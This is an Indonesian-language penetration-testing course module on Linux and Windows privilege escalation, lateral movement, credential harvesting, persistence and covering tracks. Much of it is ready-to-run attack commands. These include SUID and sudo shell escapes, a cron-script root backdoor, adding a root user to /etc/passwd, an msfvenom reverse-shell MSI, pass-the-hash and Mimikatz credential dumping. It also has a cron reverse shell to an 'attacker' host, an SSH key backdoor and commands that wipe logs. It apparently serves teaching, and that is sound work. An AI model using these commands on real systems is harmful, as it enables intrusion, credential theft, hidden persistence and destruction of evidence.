# ⬆️ P12 — PRIVILEGE ESCALATION & POST-EXPLOITATION

> *"Getting a foothold is just the beginning. The real game starts after."*

---

## 1. APA ITU PRIVILEGE ESCALATION?

Setelah mendapat akses awal (biasanya sebagai user biasa), **privilege escalation (privesc)** adalah proses mendapatkan hak akses lebih tinggi — idealnya **root/SYSTEM**.

```
Initial Access (low-priv user)
         │
         ▼
  Privilege Escalation
         │
    ┌────┴────┐
    ▼         ▼
HORIZONTAL   VERTICAL
(user→user)  (user→root)
```

---

## 2. LINUX PRIVILEGE ESCALATION

### 2.1 Enumeration Tools

```bash
# LinPEAS — automated enumeration (WAJIB!)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Manual enumeration:
whoami && id                    # Siapa saya?
uname -a                       # Kernel version
cat /etc/os-release             # OS version
sudo -l                         # Apa yang bisa saya sudo?
cat /etc/crontab                # Cron jobs
find / -perm -4000 2>/dev/null  # SUID files
ls -la /etc/passwd /etc/shadow  # Permission file password
env                             # Environment variables
history                         # Command history (credentials?)
cat ~/.bash_history             # Bash history
find / -writable -type f 2>/dev/null  # Writable files
ps aux                          # Running processes
netstat -tulnp                  # Listening services (internal)
```

### 2.2 Teknik Privilege Escalation Linux

#### SUID Exploitation

```bash
# Cari SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Contoh output:
/usr/bin/find       ← BERBAHAYA!
/usr/bin/vim        ← BERBAHAYA!
/usr/bin/python3    ← BERBAHAYA!
/usr/bin/nmap       ← BERBAHAYA!

# Eksploitasi (cek GTFOBins: gtfobins.github.io)

# find SUID → root shell:
find . -exec /bin/bash -p \;

# vim SUID → root shell:
vim -c ':!/bin/bash'

# python3 SUID → root shell:
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (old version) SUID:
nmap --interactive
!sh
```

#### Sudo Misconfigurations

```bash
# Cek apa yang bisa di-sudo tanpa password
sudo -l
# Output: (ALL) NOPASSWD: /usr/bin/vim

# Eksploitasi sudo vim:
sudo vim -c ':!/bin/bash'
# → Root shell!

# sudo find:
sudo find / -exec /bin/bash \;

# sudo awk:
sudo awk 'BEGIN {system("/bin/bash")}'

# sudo less/more:
sudo less /etc/shadow
# Lalu ketik: !/bin/bash

# sudo env:
sudo env /bin/bash
```

#### Cron Job Exploitation

```bash
# Cek cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Jika cron menjalankan script yang writable:
# /etc/crontab: * * * * * root /opt/backup.sh

# Dan kita bisa edit /opt/backup.sh:
echo '#!/bin/bash' > /opt/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh

# Tunggu cron jalan, lalu:
/tmp/rootbash -p
# → Root shell!
```

#### Kernel Exploits

```bash
# Cek kernel version
uname -r

# Cari exploit untuk kernel version tersebut
searchsploit "linux kernel 4.4"
# Atau: google "Linux kernel 4.4.0 privilege escalation"

# Contoh terkenal:
# DirtyCow (CVE-2016-5195) — Linux kernel < 4.8.3
# DirtyPipe (CVE-2022-0847) — Linux kernel 5.8-5.16.11
```

#### Writable /etc/passwd

```bash
# Jika /etc/passwd writable:
# Generate password hash:
openssl passwd -1 -salt hacker password123
# → $1$hacker$6.../

# Tambah user root baru:
echo 'hacker:$1$hacker$6...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login:
su hacker
# → Root!
```

---

## 3. WINDOWS PRIVILEGE ESCALATION

### 3.1 Enumeration

```powershell
# Manual
whoami /all                     # User + privileges
systeminfo                      # OS version, patches
net user                        # List users
net localgroup administrators   # Admin group members
netstat -ano                    # Listening ports
wmic service list brief         # Running services
schtasks /query /fo LIST /v     # Scheduled tasks
icacls "C:\path"                # File permissions

# WinPEAS (automated)
winpeas.exe
```

### 3.2 Teknik Privesc Windows

#### Unquoted Service Path

```
# Service path tanpa quotes:
C:\Program Files\My App\My Service\service.exe

# Windows mencoba (berurutan):
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My App\My.exe
C:\Program Files\My App\My Service\service.exe

# Jika kita bisa tulis ke C:\Program Files\My App\:
# Taruh malicious My.exe → service restart → payload dijalankan sebagai SYSTEM!
```

#### AlwaysInstallElevated

```powershell
# Cek registry:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Jika keduanya = 1:
# Buat malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f msi -o evil.msi

# Install:
msiexec /quiet /qn /i evil.msi
# → SYSTEM shell!
```

#### Token Impersonation

```
# Jika punya SeImpersonatePrivilege (common di service accounts):
# Gunakan tools: JuicyPotato, PrintSpoofer, GodPotato

# PrintSpoofer:
PrintSpoofer.exe -i -c "cmd /c whoami"
# → nt authority\system

# GodPotato:
GodPotato.exe -cmd "cmd /c reverse_shell.exe"
```

---

## 4. LATERAL MOVEMENT

Berpindah dari satu sistem ke sistem lain di jaringan internal.

### Pass-the-Hash (PtH)

```bash
# Setelah dump hash (hashdump di Meterpreter):
# Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::

# Gunakan hash langsung tanpa crack password!
# CrackMapExec:
crackmapexec smb 10.10.10.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

# PsExec via Impacket:
impacket-psexec Administrator@10.10.10.5 -hashes aad3b435...:31d6cfe0...
```

### Pass-the-Ticket (Kerberos)

```bash
# Extract tickets dengan Mimikatz (Windows):
mimikatz# sekurlsa::tickets /export

# Inject ticket:
mimikatz# kerberos::ptt ticket.kirbi

# Akses resource:
dir \\server\share
```

---

## 5. CREDENTIAL HARVESTING

```bash
# Linux:
cat /etc/shadow                  # Password hashes (butuh root)
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name ".bash_history" 2>/dev/null  # Command history
strings /dev/mem | grep -i pass  # Memori (butuh root)

# Windows (Mimikatz):
mimikatz# sekurlsa::logonpasswords    # Plaintext passwords dari memori!
mimikatz# lsadump::sam                 # SAM database hashes
mimikatz# lsadump::dcsync /user:Administrator  # DCSync attack

# Password files umum:
# Web config: wp-config.php, .env, config.yml, web.config
# SSH keys: ~/.ssh/id_rsa
# Browser stored passwords
# KeePass databases (.kdbx)
```

---

## 6. PERSISTENCE & COVERING TRACKS

### Persistence (Mempertahankan Akses)

```bash
# Linux:
# Backdoor SSH key
echo "attacker_public_key" >> /root/.ssh/authorized_keys

# Cron backdoor
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/crontab

# Windows:
# Registry Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "C:\payload.exe"

# Scheduled task
schtasks /create /tn "Update" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM
```

### Covering Tracks

```bash
# Linux:
# Clear bash history
history -c && history -w
cat /dev/null > ~/.bash_history

# Clear auth logs
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Modify timestamps
touch -r /etc/passwd /tmp/backdoor   # Copy timestamp dari file lain

# Windows:
# Clear event logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

> ⚠️ **ETIKA**: Covering tracks hanya dilakukan di lab/CTF. Di real pentest, JANGAN hapus log — itu bukti dan bisa melanggar scope.

---

## 7. CHECKLIST PEMAHAMAN P12

- [ ] Jelaskan perbedaan horizontal dan vertical privilege escalation
- [ ] Cari dan eksploitasi SUID binary menggunakan GTFOBins
- [ ] Eksploitasi sudo misconfiguration
- [ ] Identifikasi privesc vector dari output LinPEAS
- [ ] Jelaskan Unquoted Service Path di Windows
- [ ] Apa itu Pass-the-Hash dan bagaimana cara kerjanya?
- [ ] Gunakan Mimikatz untuk credential harvesting
- [ ] Selesaikan TryHackMe Linux & Windows privesc room
- [ ] Apa itu lateral movement dan 2 tekniknya?
- [ ] Jelaskan mengapa covering tracks penting di CTF tapi tidak etis di real engagement

---

## 🎉 SELESAI PHASE 2 — OFFENSIVE SECURITY

Kamu sekarang memahami sisi penyerang:
- ✅ Reconnaissance & OSINT
- ✅ Network Scanning & Enumeration
- ✅ Exploitation & Metasploit
- ✅ Web Hacking (OWASP Top 10)
- ✅ Privilege Escalation & Post-Exploitation

*Selanjutnya: [Phase 3 — Defensive Security](../../Phase3-Defensive/)*
